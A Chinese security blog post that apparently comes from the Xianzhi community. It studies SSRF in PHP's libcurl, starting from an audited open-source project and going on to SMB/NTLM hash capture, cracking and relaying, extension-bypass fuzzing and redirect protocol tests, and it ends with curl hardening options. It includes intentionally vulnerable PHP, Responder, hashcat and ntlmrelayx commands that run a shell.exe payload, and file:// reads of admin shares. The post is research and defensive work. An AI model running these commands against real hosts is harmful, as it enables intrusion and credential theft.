

# 以洞打洞看PHP下的SSRF的攻与防 - 先知社区

以洞打洞看PHP下的SSRF的攻与防

- - -

## 前言

  本文的灵感最初起源于有师傅师傅咨询我曾经挖到某套系统的SSRF没办法打Redis是为什么，但是当时自己对这个没太上心，后来随着自己挖了不少SSRF漏洞利用起来遇到类似的问题，逐渐开始思考SSRF的攻击面及其局限性，故有了本文，同时，SSRF作为一个漏洞存在，它的使命就是帮助你打穿另外一个洞，这就是本文以洞打洞标题的由来。

## 前台SSRF漏洞

接着，上次的审计的开源项目: [https://github.com/LyLme/lylme\_spage](https://github.com/LyLme/lylme_spage)

通过一样的审计思路，通过快速通读全文代码的，基本可以了解一些基础功能，比如`curl`加载网络请求的功能，可以找到多处利用点，最终可以回溯调用的入口点，确定触发点在前台的漏洞。

### 漏洞点1

[![](assets/1701134864-e1ce8a28d0eebb5af3dcb5739f293a01.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142732-0c2f61a2-8cee-1.png)

如图可看到`get_head`未对用户输入进行过滤，通过`get_curl`可造成SSRF漏洞，不过这个漏洞因为是个盲SSRF，利用并不直观，故不展开。

[![](assets/1701134864-a82a52d016a142780498e11b1c49eb8b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142749-16075306-8cee-1.png)

### 漏洞点2

重点放在另外的一个SSRF漏洞上，从功能设计角度来说，该点也是最容易出现出现问题的。

漏洞文件: include/file.php

正常开发逻辑，include 目录文件的内容应该主要是功能函数、类函数模块等不支持直接调用的，但是这里开发者并没有很严谨，提供直接调用入口。

[![](assets/1701134864-c5438b5a1f0275b6236fc89bbded1a47.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142804-1f070546-8cee-1.png)

当你顾名思义认为这可能是一个任意文件上传/任意文件下载的漏洞的时候，那么你很显然低估了开发者对安全的认知，仔细跟进它的代码，可以看到开发者其实对安全是有一定的了解的，但是并不全面也不深刻，所以造成漏洞的存在。

上传漏洞的后缀一眼过去，找不到一点赋值可能，后面还有一个`empty`判断，这种顺序的写法，显然可以看出开发者对安全问题的有一定的重视。

[![](assets/1701134864-66c12a227cf49678c50ec80148ff46b0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142824-2ac1e52c-8cee-1.png)

那么SSRF漏洞是怎么形成的呢？跟进`download_img`方法

[![](assets/1701134864-e4dea86c1529145b22c5f7525d2ec8a2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142838-33087f48-8cee-1.png)

其中`remote_filesize` 没有限制任何协议，可惜的是，只回显长度，是一个盲SSRF，skip it， go on。

[![](assets/1701134864-2f0869f6dc38b2ae22494e746f28f17c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142853-3c1535cc-8cee-1.png)

继续跟进去，可以看到通过`pathinfo`的`PATHINFO_EXTENSION`获取到URL文件的后缀，并做白名单，限制只能为`jpg`、`gif`等图片资源。

[![](assets/1701134864-8afae3dc27f152d37b4bdcc804107334.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142911-46e593fc-8cee-1.png)

通过检验之后，`$url`会被`curl_setopt`进行处理，最终通过`curl_exec`造成SSRF漏洞，同时请求的结果`$data`最终会被写进到`$save_to`并返回值给客户端。

[![](assets/1701134864-8c92bed7f0f64c951ab36d09efed34b6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142927-503a2012-8cee-1.png)

下面是漏洞潜在利用的一个基本展示。

[![](assets/1701134864-3d20406efe7b76ee8608c5ce73df8567.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142938-56b9e940-8cee-1.png)

根据返回结果，访问保存内容生成的图片URL，可成功回显出请求的数据。

[![](assets/1701134864-b141f66b8a14f5ae6dc77369e74b7327.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127142954-60d323b0-8cee-1.png)

## 提出一些问题

PHP 已经是N年前的产物了，花样也已经被研究得差不多了，作者自认为对PHP的常见tricks还算是比较了解的，但面对这样的情况-该如何全面地去利用这个SSRF，内心却还是没有底。

[![](assets/1701134864-4e07b629dc66ae7d4ffbd7378620ad84.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143008-68b8f4b0-8cee-1.png)

**首先，明确下目前环境条件：**

1) curl 对传入协议没有做限制

2) curl 开启跟随跳转支持301

3) 限制文件的后缀必须为 `array("jpg", "gif", "png", "ico");`

**下面是一些随之而来的疑问：**

根据条件1)，考虑漏洞点支持`file://`协议且已知该漏洞为存在回显的SSRF，那么是不是意味着可以实现任意文件读取呢？

根据条件2)，考虑漏洞点支持跳转，故可以绕开后缀限制，指定任意一个URL传递给`curl`二次处理，那么能不能传递`file://`协议呢？

根据条件1）2）3），深入考虑下如果条件1）限制只允许`http`的话,这种相对另类的有限制SSRF漏洞的攻击面和防御方式的上下限又会到底在哪里呢？

### 测试 Demo

回到本文的焦点，为了方便测试，写一个存在 SSRF 漏洞的`fuzz.php`文件。

```plain
<?php
$url = $_REQUEST['url'];
$ch = curl_init();
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
curl_setopt($ch, CURLOPT_POST, 0);
curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLPROTO_ALL, 1);
if (!empty($referer)) {curl_setopt($ch, CURLOPT_REFERER, $referer);}
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
//超过10秒不处理
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//执行之后信息以文件流的形式返回
$data = curl_exec($ch);
if(curl_errno($ch)) {
    echo 'Curl error: ' . curl_error($ch);
}else{
  print_r($data);
}
curl_close($ch);
```

代码未对SSRF作任何限制。

[![](assets/1701134864-773e95616858bca5b39dc298efe907a0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143029-7552ed16-8cee-1.png)

## 深入 cURL 文档

阅读PHP的官方文档: [https://www.php.net/manual/zh/curl.installation.php，了解到\`curl\_init\`等一系列方法，都是以模块\`--with-curl\`的方式集成进来的](https://www.php.net/manual/zh/curl.installation.php%EF%BC%8C%E4%BA%86%E8%A7%A3%E5%88%B0%60curl_init%60%E7%AD%89%E4%B8%80%E7%B3%BB%E5%88%97%E6%96%B9%E6%B3%95%EF%BC%8C%E9%83%BD%E6%98%AF%E4%BB%A5%E6%A8%A1%E5%9D%97%60--with-curl%60%E7%9A%84%E6%96%B9%E5%BC%8F%E9%9B%86%E6%88%90%E8%BF%9B%E6%9D%A5%E7%9A%84)

[![](assets/1701134864-c69d9009a3802675f23ad967839e65d4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143056-858eebe4-8cee-1.png)

PHP执行 `var_dump(curl_version)`，根据返回信息知测试PHP环境内置`curl`版本为`7.52.1`，编译的`libcurl`扩展内置支持如图所示 20 种网络协议。

[![](assets/1701134864-3bf2bbb913ec7f5b4150d814a7849539.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143049-81498670-8cee-1.png)

继续查阅 curl的`setopt`相关文档: [https://www.php.net/manual/en/function.curl-setopt.php](https://www.php.net/manual/en/function.curl-setopt.php) 发现提到一个属性 **`CURLOPT_REDIR_PROTOCOLS`** 跟允许**`CURLOPT_FOLLOWLOCATION`** 请求的协议紧密联系。

[![](assets/1701134864-e5151d314cb77b14c6d90bc948e1e4f2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143124-96082d50-8cee-1.png)

文档中提到，默认的情况`cURL`处理重定向会支持除了 `FILE` 和 `SCP` 协议之外的所有协议，不过有一个例外需要重点注意 `pre-7.19.4`版本有点特殊。

值的注意的是，不同系统的 `curl` 发行版默认支持的协议是存在差异的，比如在我的MacOS自带的`curl`，支持的协议列表就没有包括`SCP`协议，Win10下的`curl`自带的协议更少。

[![](assets/1701134864-6ad5794a4d8ca6997dca152f9cde2421.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143137-9df2fde2-8cee-1.png)

但是在 ubuntu 22.0 自带 `curl` 是有 `scp` 协议的。

[![](assets/1701134864-d7ffa0c006c4803878f57fac2ca05be7.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143152-a6cb5f4a-8cee-1.png)

> 读者须知！！！！！！
> 
> 下文由于多次修改与测试，图例IP由于DHCP动态获取所以可能会产生变动。

## 探索 SMB 协议

在上述提到的的19种协议，其中`smb`和`smbs`协议在`curl`鲜为人知，甚至网上的资料也比较少，真的非常可惜，故不得已做了很多失败的尝试。

其中，Finally with cURL 7.40 is support for the SMB/CIFS protocol for downloading files with curl from Windows shares，说明 cURL 7.40 是smb协议支持的分水岭。

> SMB协议（Server Message Block）是一种用于文件共享、打印服务和其他网络通信的协议。它最初由微软开发，用于在局域网中的计算机之间共享文件、打印机和其他资源。SMB协议允许客户端计算机通过网络连接到服务器，并请求访问共享的文件或其他服务。
> 
> SMBS协议（SMB Secure）是对SMB协议的安全扩展版本。它为SMB通信提供了加密和认证的功能，以确保数据的机密性和完整性。SMBS协议通过使用加密算法和数字证书来防止未经授权的访问和数据篡改，提供了更高的安全性。

- - -

首先，了解下SMB的发展历史:

[https://zh.wikipedia.org/wiki/Server\_Message\_Block](https://zh.wikipedia.org/wiki/Server_Message_Block)

[https://www.snia.org/sites/default/files/TomTalpey\_SMB3\_Remote\_File\_Protocol-fast15final-revision.pdf](https://www.snia.org/sites/default/files/TomTalpey_SMB3_Remote_File_Protocol-fast15final-revision.pdf)

发展过程由先到后排序: SMB 1.0 -> CIFS -> SMB2.0 -> SMB2.1 -> SMB3.0

1.SMB 1.0 （1983 年）一开始设计基于NetBios协议，后Window 2000(1999 年) 引入SMB直接在TCP/IP上运行的功能。

2.CIFS (1996 年) ，微软提出将SMB改称为Common Internet File System(CIFS),此外微软还加入了许多新的功能,于此同时，1992年出现Samba协议，支持在非Windows系统访问Windows资源。

3.SMB 2.0 (2006 年) Microsoft 随着 [Windows Vista](https://zh.wikipedia.org/wiki/Windows_Vista) 的发布 引入了新的SMB版本 (SMB 2.0 or SMB2)

4.SMB 2.1 SMB 2.1, 随 Windows 7 和 Server 2008 R2 引入, 主要是通过引入新的机会锁机制来提升性能。

5.SMB 3.0 (前称 SMB 2.2) 在Windows 8 和 Windows Server 2012 中引入。

- - -

一开始，由于对SMB协议版本不甚了解，`curl` 对于smb的官方文档介绍也很含糊，所以只能沿用常见的`smb`协议利用攻击手段进行黑盒测试，遇到了不少坑，兜兜转转，最终只能通过一些旁门左道勉强走通，回过头来看，才明白拥有阅读源码的能力多么重要，也不禁感慨那些开天劈地研究新东西的师傅是多么令人可敬。

**1）Net-NTLM 劫持 失败！**

Linux 环境可以直接运行 `Responder`

```plain
git clone nhttps://github.com/lgandx/Responder.git
pip3 install Responder
```

`Responder` 作者`lgandx`在ISSUE明确地说过不支持 MacOS 环境，故这里尝试用到 Docker

```plain
git clone https://github.com/alexfrancow/docker-responder.git
cd docker-responder
docker build -t responder . --network=host
```

修改下项目下的 Dockerfile 文件配置代理，要不然 `apt upgrade` 因为墙的问题导致无法执行下去。

```plain
ENV http_proxy http://lan-ip:7890
ENV https_proxy http://lan-ip:7890
......................
xxxxxxxxxxxxxxxxxxxxxxxxxxxx
......................
ENV http_proxy ""
ENV https_proxy ""
```

host模式启动

```plain
docker run --network=host -it responder
```

结果还是不行... 非常可惜，那么好用的工具，我个人虽然有两台电脑，但是很多时候不能带两台,所以最好的办法还是想办法集成到MacOS里。

最后，选择 [https://www.kali.org/get-kali/#kali-virtual-machines](https://www.kali.org/get-kali/#kali-virtual-machines) 按照 KaLI 的虚拟机VirtualBox安装大小3G，解压后15G，挺大的只能放置外置存储

VirtualBox 新建一个虚拟机

[![](assets/1701134864-fa44e02bf8f0a7722ff84bb33d772bb0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143215-b4ba55d4-8cee-1.png)

然后选择虚拟硬盘的时候使用现有的，即官方下载的虚拟机文件 \*.vdi,即可直接导入KaLi虚拟机。

[![](assets/1701134864-195aa537a8305781d25fc6f6b60c1671.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143234-c003f54e-8cee-1.png)

修改网络为Bridged(桥接），保证另一台 Windows 和 KaLi 在一个局域网里面。kaLI 已经内置responder

```plain
sudo responder -I eth0 -dwv
```

不过很可惜，通过SSRF 访问`http://192.168.0.117/ssrf.php?url=smb://192.168.0.123/share/1.txt` ，甚至根据官方给出的`curl`

[![](assets/1701134864-66756a41ded8710ff4885d45d3923ff5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143257-cd709d86-8cee-1.png)

Responder 一点反应都没有，`curl_error($ch)`也没有任何信息，一切看起来都静悄悄地，甚至我一度怀疑`smb`协议是一个摆设?

**2）NTLM 中继 失败 ！**

NTLM 中继成功的前提是 SMB 签名必须是未开启状态或者是禁用状态。

```plain
nmap --script=smb2-security-mode.nse -p445  192.168.0.114
```

SMB签名除了域控其他系统默认都是不开启的，所以一开始我的想法很大胆，当然后面通过实验，验证很多想法是不成立的，一开始本是想着如果1）成立可获得高权限凭证，那么直接smb中继自己/其他人，甚至可以超越SSRF实现命令执行，但是现连NTLM劫持都做不了，又谈何中继呢？ 失败！

[![](assets/1701134864-b38813a1e7c593c15dc12072e364f21a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143315-d82904de-8cee-1.png)

### NTLM 攻击灵感

不得不在这里提一下，在第一眼看到`smb`协议的时候，脑子瞬间就有攻击利用的想法，其一激发笔者思考NTLM攻击的灵感来源于 [CVE-2019-15601](https://nvd.nist.gov/vuln/detail/CVE-2019-15601) 这个漏洞，它是一个非常有趣且可能容易被低估的漏洞，其二便是自己平时对于`smb`的一些经验和理解。

SMB access smuggling via FILE URL on Windows

漏洞描述:

> 如果构建给定的路径，以两个斜杠（或反斜杠）开始，后跟主机名，Windows系统将自动将其视为使用SMB访问主机名的请求，而不是读取具有该名称的本地文件。这不是libcurl行为的预期或文档规范的行为。

影响版本:

> libcurl <= 7.68.0

[![](assets/1701134864-09e30471ba05642e092328243af98c54.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143347-ebb63936-8cee-1.png)

所以，如果构造如下请求，上面两种的基于SMB攻击从理论上来说都是可以实现的。

[![](assets/1701134864-35a5196d5e19afe4fc390e4c802788eb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143338-e658517c-8cee-1.png)

```plain
# 解压 rockyou.txt.gz
gzip -d /usr/share/wordlists/rockyou.txt.gz
# 爆破密码
sudo hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.0.123.txt /usr/share/wordlists/rockyou.txt
```

[![](assets/1701134864-466ddf3bbc44e6ffb96e11ae9aaa85d4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143411-f9cdde0c-8cee-1.png)

成功爆破到administrator账户密码为123456，下面尝试利用Relay中继尝试升级SSRF漏洞为RCE漏洞。

判断被攻击IP能否读取到`win.ini`，如果可以，说明存在SSRF的漏洞主机与被攻击机器拥有相同的NTLM Hash，故可以考虑中继或者读取敏感文件内容，前提是`c$`共享存在，有些环境是不存在的。

```plain
file:////192.168.0.128/c$/windows/win.ini
```

然后，接着通过 ntlmrelayx 进行SMB中继反弹shell。

```plain
# 禁用 445 http，SSRF利用的话该步骤不需要做，
vim /usr/share/responder/Responder.conf 
sudo responder -I eth0 -v

# 使用ntlmrelayx进行中继
sudo impacket-ntlmrelayx  -t 192.168.0.128 -smb2support -e "shell.exe"
```

[![](assets/1701134864-1f414eed5ceb64cffe94dab4776d0d33.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143420-ff604508-8cee-1.png)

理想环境下似乎很给力，不过这种攻击方式有明显局限性:

1) libcurl >= 7.68 已经无法使用。

2) 必须要支持`file://`协议，这类情况相对来说，攻击面并不广泛，因为`cURL` 明确指出重定向不会支持`file`&`scp`。

3) 利用条件苛刻，自 \[MS08-068 Patch\]之后 smb 并不能中继自己，所以漏洞利用必须在多机环境下，且攻击者已经具备内网权限。

关于MS08-068影响版本在: [https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-068](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2008/ms08-068) Window Server 2008 之前。

此Patch补丁主要修复 NTLM反射漏洞 CVE 2008-4037， 现在已经2023年了，已经是非常古老的古老的利用方式，实战可用性并不高。

[![](assets/1701134864-de1818d2a0cf323854cd882bfa1110a1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143436-08b1d068-8cef-1.png)

### 从 cURL 看 SMB 协议

单单从时间线来看，`curl` 7.40 推出`smb`协议支持，`curl 7.68` 爆出`file://`走私`smb`漏洞，预期理想情况，不应该出现上面测试失败的结果。按照现有的资料来看，`curl` 如果完美支持`smb`协议的话，那么在《NTLM 攻击灵感》这一小节提到的1） 2）这两点限制将不复存在，似乎理想是美好的，但现实却是非常残酷。

通过wireshark抓包`curl`的`smb`协议通讯过程流量并与正常浏览网络目录的`smb`流量对比就能发现问题: **curl仅支持smbv1.0协议**

经过测试，命令行的`curl`和PHP执行的效果大体接近，故为了方便测试，直接使用`curl`命令进行测试

如图可知，一定要这样的格式才能触发出正确的TCP请求: `smb://host/sharename/` 非常严格，缺一斜杠一目录都不可，要不然就发不出去请求。

[![](assets/1701134864-aecdb382455f97ddbc2ca2b194ada69a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143454-1334d09e-8cef-1.png)

不过这个情况，建立TCP连接就被`FIN`，说明客户端主动关闭连接，要发出`Negotiate Request`，必须携带用户名和密码请求:

smb://user:passwd@192.168.0.114/share/1.txt

[![](assets/1701134864-dc48bd1d6962d01a0ca1336df411778f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143508-1be20b4e-8cef-1.png)

如图所示，这次是服务端拒绝请求`RST`，为什么还是不行呢？ 在`curl`的github仓库有个issue: [support smbv2/3 and/or update documentation](https://github.com/curl/curl/issues/5679)

[![](assets/1701134864-c195ae96c4b9ecc95769a04997fd0557.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143522-2433438a-8cef-1.png)

后来官方提交了 commit 提到这个问题: [https://github.com/curl/curl/pull/5686/commits/a63738aae3df97628ba2566594bf3c56c0d71ae7](https://github.com/curl/curl/pull/5686/commits/a63738aae3df97628ba2566594bf3c56c0d71ae7) ,至此才能通过man命令看到这个"坑点。

[![](assets/1701134864-d3f66f017af8e34a740be26b5e1e211e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143533-2a6a35a6-8cef-1.png)

当然通过分析 `Negotiate Protocol Request` 也可以知道，客户端只支持`NT LM 0.12`

[![](assets/1701134864-b9918f4ea8fc7e23a3fd11a44e801e61.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143551-357a22bc-8cef-1.png)

前往控制面板 -> 启用或关闭 windows 功能 -> 安装打开 SMB1.0/CIFS 文件共享支持

> 由于 Windows 10 Fall Creators Update 和 Windows Server 版本 1709 (RS3)，默认情况下不再安装服务器消息块版本 1 (SMBv1) 网络协议。 从 2007 年开始，它被 SMBv2 和后来的协议所取代。 Microsoft 在 2014 年公开弃用了 SMBv1 协议。

[![](assets/1701134864-011aa05706bf66a665f650751a0183ea.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143603-3c5b088a-8cef-1.png)

此时重新进行SSRF请求，可以看到能够正常请求到`无密码保护的`共享目录下的文件，很多时候 `c:\Users\`也会被开启。

[![](assets/1701134864-ec1f27dbda1ff6a8cb35ab081ea54410.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143611-41681732-8cef-1.png)

通过WireShark的通信流量可以看到当不输入密码的时候会以`Guest`状态访问可以正常访问，反之则会通过密码进行验证，密码不对则无法访问。

[![](assets/1701134864-84f83ee2c7e7fd5b2dce3f2b536c6c9b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143620-46bc91ea-8cef-1.png)

## Fuzz 测试

SSRF 基于 SMB 的攻击面依然还是有限，下面通过Fuzz的方式看看能不能有更好的利用方式

### Fuzz 1 任意文件读取

Window libcurl: 7.64.0

[![](assets/1701134864-d3f3080e3efef31640a0ad2bcd820e6b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127143637-5095fae4-8cef-1.png)

经过测试可以知道Window下通过 # 和 ? 可以绕过后缀限制。

[![](assets/1701134864-71d4f4de8895788e6816df9d244840b0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145618-107b0c1c-8cf2-1.png)

**OSX libcurl: 7.52.1**

url=file:///etc/passwd{1}{2}{3}jpg

编写`fuzz.php`，直接`255*255*255`次数太多会导致内存分配出错，`255*255*2`会好一点，代码设计如下

```plain
<?php
error_reporting(E_ALL & ~E_WARNING);
ini_set('memory_limit', '-1');
$url = "file:///etc/passwd";
$validArrays = array();
for($pos=0; $pos<=255; $pos++){
    $char1 = sprintf("%02x", $pos);
    for($p2=0; $p2<=255; $p2++){
        $char2 = sprintf("%02x", $p2);
        $url .= urldecode("%".$char1);
        $url .= urldecode("%".$char2);
        // 第一种
        //$url.= ".jpg";
        // 第二
        $url .= "jpg";
        $ext = pathinfo($url, PATHINFO_EXTENSION);
        if($ext == "jpg"){
            array_push($validArrays, $url);
        }
    }
}
print_r("check valid Done!");
print_r(count($validArrays));

for($pos=0; $pos<count($validArrays);$pos++){
    $checkUrl = $validArrays[$pos];
    try{
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
        curl_setopt($ch, CURLOPT_ENCODING, 'gzip');
        curl_setopt($ch, CURLOPT_POST, 0);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLPROTO_ALL, 1);
        curl_setopt($ch, CURLOPT_URL, $checkUrl);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $data = curl_exec($ch);
        print_r($data);
        curl_close($ch);
    }catch (Exception $err){
//        print_r($checkUrl." err:".$err);
    }
}
```

没有任何结果，况且由于PHP性能问题导致Fuzz速度并不快，没办法做更彻底更多位置变异的测试，不过目前从黑盒角度来说，基本可判定如果限制后缀，做不到`file:///` Bypass读取任意文件的内容。

### Fuzz 2: 重定向状态码

利用 Location 跳转具体支持什么协议，HTTP1.0 设计中关于跳转常见有两种状态码 301 和 302 还有一个比较少见是 303，303和302都属于临时不缓存。

状态码部分更多介绍可以详细参考 [https://everything.curl.dev/http/redirects](https://everything.curl.dev/http/redirects)

[![](assets/1701134864-094ca913f2dd86d4ad8a29421c975f25.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127150206-e05aac94-8cf2-1.png)

如上图所示，对于 `curl` 来说与浏览器不同的是，面对状态码是301还是302，甚至303，是没有区别的，不过还有一些有意思的状态码，可以决定了第二次请求的HTTP Method。

[![](assets/1701134864-ed524e9e658fd54b9e65303bfee4fbb4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127150217-e6e0f1cc-8cf2-1.png)

测试代码

```plain
<?php
$code = isset($_GET["code"]) ? $_GET["code"] : "";
$url = isset($_GET["url"]) ? $_GET["url"] : "";

// 判断传入的$code值，然后设置相应的状态码和重定向
if ($code === "301") {
    header("HTTP/1.1 301 Moved Permanently");
} elseif ($code === "302") {
    header("HTTP/1.1 302 Found");
} elseif ($code === "303") {
    header("HTTP/1.1 303 See Other");
} elseif ($code === "307") {
    header("HTTP/1.1 307 Temporary Redirect");
} elseif ($code === "308") {
    header("HTTP/1.1 308 Permanent Redirect");
} else {
    // 默认为302 Found
    header("HTTP/1.1 302 Found");
}

// 设置重定向的目标URL
header("Location: $url");

// 确保在发送头部之后立即退出脚本
exit();
?>
```

[![](assets/1701134864-5cff7d00ccd14b661124cc1f0745905f.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145648-225ce220-8cf2-1.png)

`libcurl` 默认是发送`GET`的，`POST` 需要设置 `curl_setopt($ch, CURLOPT_POST, true);` ，如果是301-303则无论客户第一次请求的方法是什么统一为`GET`,如果是307-308，则请求方法由第一次的请求方法决定。

关于这个trick，最经典的运用莫过于P牛的一篇文章: [CVE-2021-21287: 容器与云的碰撞——一次对MinIO的测试](https://www.leavesongs.com/PENETRATION/the-collision-of-containers-and-the-cloud-pentesting-a-MinIO.html),成功将一个只能控制Host的SSRF转变为灵活的POST请求，在实际的渗透测试过程中，多次挖掘过与此trick相关SSRF漏洞，特别是一些POST类型的SSRF，第一眼看上去的时候会感觉很鸡肋，但是结合项目的一些设计，可以很轻松调用内部的接口，Bypas鉴权，从而RCE。

### Fuzz 3: 重定向支持的协议

**网络请求**

验证 `libcurl` 重定向所支持的协议,可按照顺序依次监听`sudo tcpdump -i pktap,lo0,eth0 -v dst portrange 10020-10040 -n -q -w ssrf.pcap`

```plain
$protocols = curl_version()["protocols"];
$startPorts = 10020;
for($pos=0; $pos < count($protocols); $pos++){
    echo "${protocols[$pos]}://192.168.0.121:".$startPorts++."\n";
}
```

作为对照组:

```plain
dict://192.168.0.105:10020
file://192.168.0.105:10021
ftp://192.168.0.105:10022
ftps://192.168.0.105:10023
gopher://192.168.0.105:10024
http://192.168.0.105:10025
https://192.168.0.105:10026
imap://192.168.0.105:10027
imaps://192.168.0.105:10028
ldap://192.168.0.105:10029
ldaps://192.168.0.105:10030
pop3://192.168.0.105:10031
pop3s://192.168.0.105:10032
rtsp://192.168.0.105:10033
smb://192.168.0.105:10034
smbs://192.168.0.105:10035
smtp://192.168.0.105:10036
smtps://192.168.0.105:10037
telnet://192.168.0.105:10038
tftp://192.168.0.105:10039
```

Burp Intruder 单线程，延迟3s 进行测试

[![](assets/1701134864-d7ac6452cdeb7a7ca0f4466dcc367d16.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145735-3e79b550-8cf2-1.png)

file协议和smb协议因为语法构造不正确，自然是发不出去网络请求的，其他的基本都可以发起请求，开始实验组重定向,会发现结果是一样的。

[![](assets/1701134864-b0c35dc6abf93324d39188233a5ffe94.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145743-43584d34-8cf2-1.png)

**注意事项**

测试302跳转的时候，Burp 不要设置并发，可能是`libcurl` 实现机制问题产生覆盖会导致很多请求包丢失，对结果造成影响。

[![](assets/1701134864-d8b06e7ef3a849987a05c0d0bea9a8f0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145801-4de7ea70-8cf2-1.png)

**聚焦协议**

SSRF 重点关注四类协议: 1) file 2) gopher 3) dict 4) smb

> 注意事项
> 
> 没有特别说明，Window和OSX/Linux测试结果一样

手工验证下这四类协议的支持情况

1）重定向默认不支持file协议

[![](assets/1701134864-dd9668d67bf547caee3234b50f2dc272.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145817-57a42786-8cf2-1.png)

2) 重定向支持 file 协议

[![](assets/1701134864-390aabb1ad3727d27fc05e0e587bcdc2.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145835-6262829e-8cf2-1.png)

3) 重定向支持 dict 协议

[![](assets/1701134864-f534b55976f2e6a221df1657483ddbb8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145844-67b142f8-8cf2-1.png)

4) 重定向默认不支持 smb 协议

[![](assets/1701134864-463c034e2783a2a9f0918e7979f7c671.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145854-6d62e832-8cf2-1.png)

## 防御SSRF思路

前面两个章节探讨了在一些特殊限制下SSRF依然可以突破协议限制，造成非预期之外的危害。

不妨让我们回到代码的本质上面来，有些业务功能不可避免需要请求外部服务，甚至非常特殊需要支持重定向，所以说如果只是在输入进行过滤是无法有效防御SSRF的。

不过，利用前面提到的`libcurl` 的一个参数，可以有效地限制`libcurl`协议，从而有效地兼顾业务和安全两个天秤。

下面是一个安全编码的code snippets:

```plain
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS | CURLPROTO_HTTP);
curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS);
curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
curl_setopt($ch, CURLOPT_TIMEOUT, 10);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2); 
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_TLSv1_2);
```

[![](assets/1701134864-05cda94dabc333148fda76ab1564c9cc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231127145921-7d894b66-8cf2-1.png)

令人感到有趣的是,就算强制设置`FILE`协议，一样也是不支持的，具体原因就需要去到底层分析源码了。

```plain
curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTPS | CURLPROTO_HTTP|CURLPROTO_FILE);
curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTPS | CURLPROTO_HTTP|CURLPROTO_FILE);
```

## 结语

  本文通过一个真实的案例进行展开，探讨SSRF漏洞存在的少众的SMB攻击面，同时对于Window/Linux环境下提出了一些Fuzz尝试和攻击面的可能性，本文更多的是基于一些经验和黑盒测试展开，涉及的底层原理较少，不过通过此文可以观察到`libcurl`的实现是存在“不完美”的，后续，阅读分析源码之后，本文的很多现象将会得以解释，并且将进一步探讨Bypass获取更多攻击面的可能性。

## 参考文章

[PHP Curl Security Hardening](https://php.watch/articles/php-curl-security-hardening)

[Responder / SMB Relay](https://refabr1k.gitbook.io/oscp/windows/active-directory-attacks)

[curl still vulnerable to SMB access smuggling via FILE URL on Windows](https://hackerone.com/reports/812969)

